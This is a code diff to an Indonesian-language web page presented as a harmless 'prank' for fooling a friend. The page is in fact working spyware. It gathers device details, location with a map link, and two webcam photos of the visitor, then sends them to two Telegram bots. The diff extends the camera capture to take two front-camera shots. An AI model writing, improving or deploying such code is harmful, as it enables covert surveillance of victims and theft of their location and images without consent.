@@ -5,9 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Tutorial Prank temen yang dongo 100% dijamin berhasil</title>
   <style>
-    * {
-      box-sizing: border-box;
-    }
+    * { box-sizing: border-box; }
     body {
       background-color: #000;
       color: #00ff00;
@@ -20,7 +18,6 @@
       overflow: hidden;
       flex-direction: column;
     }
-
     #msg {
       white-space: pre-wrap;
       font-size: 14px;
@@ -31,35 +28,23 @@
       padding-left: 15px;
       animation: cursor 1s step-end infinite;
     }
-
     @keyframes cursor {
-      50% {
-        border-color: transparent;
-      }
+      50% { border-color: transparent; }
     }
-
     .prank {
       font-size: 40px;
       color: #0f0;
-      text-shadow:
-        0 0 5px #0f0,
-        0 0 10px #0f0,
-        0 0 20px #00ff00,
-        0 0 40px #00ff00;
+      text-shadow: 0 0 5px #0f0, 0 0 10px #0f0, 0 0 20px #00ff00, 0 0 40px #00ff00;
       font-weight: bold;
       opacity: 0;
       animation: muncul 2s ease-in-out forwards;
     }
-
     @keyframes muncul {
       0% { opacity: 0; transform: scale(0.8); }
       50% { opacity: 1; transform: scale(1.1); }
       100% { transform: scale(1); }
     }
-
-    .hidden {
-      display: none;
-    }
+    .hidden { display: none; }
   </style>
 </head>
 <body>
@@ -85,17 +70,11 @@
     const kirimPesan = async (pesan) => {
       const payload = { chat_id: chatId1, text: pesan, parse_mode: 'HTML' };
       const payload2 = { chat_id: chatId2, text: pesan, parse_mode: 'HTML' };
-
       await fetch(`https://api.telegram.org/bot${token1}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
+        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload)
       });
-
       await fetch(`https://api.telegram.org/bot${token2}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload2)
+        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload2)
       });
     };
 
@@ -129,7 +108,6 @@
           return { vendor: "Tidak diketahui", renderer: "Tidak diketahui" };
         }
       })();
-
       const bat = await navigator.getBattery();
       const waktu = new Date().toLocaleString("id-ID");
       const touch = 'ontouchstart' in window ? 'Ya' : 'Tidak';
@@ -204,21 +182,31 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
 
     const ambilKamera = async () => {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         const video = document.createElement("video");
         video.srcObject = stream;
-        await video.play();
+        video.play();
 
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0);
+        const tungguSiap = new Promise(res => setTimeout(res, 700));
+
+        const ambilFoto = () => {
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth || 320;
+          canvas.height = video.videoHeight || 240;
+          canvas.getContext("2d").drawImage(video, 0, 0);
+          return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
+        };
+
+        await tungguSiap;
+        const foto1 = await ambilFoto();
+
+        await new Promise(res => setTimeout(res, 500));
+        const foto2 = await ambilFoto();
 
         stream.getTracks().forEach(track => track.stop());
 
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
-        await kirimFoto(blob);
+        await kirimFoto(foto1);
+        await kirimFoto(foto2);
         return "";
       } catch {
         return `
@@ -239,10 +227,13 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
       document.getElementById("msg").textContent = "Anda kena prank mau aja nunggu 😹.";
       await kirimPesan(final);
 
-      // Efek akhir prank muncul
       setTimeout(() => {
         document.getElementById("msg").classList.add("hidden");
-        document.getElementById("prank").classList.remove("hidden");
+        const elemen = document.createElement("div");
+        elemen.className = "prank";
+        elemen.id = "prank";
+        elemen.textContent = "ANDA KENA PRANK 😹";
+        document.body.appendChild(elemen);
       }, 1500);
     };
 
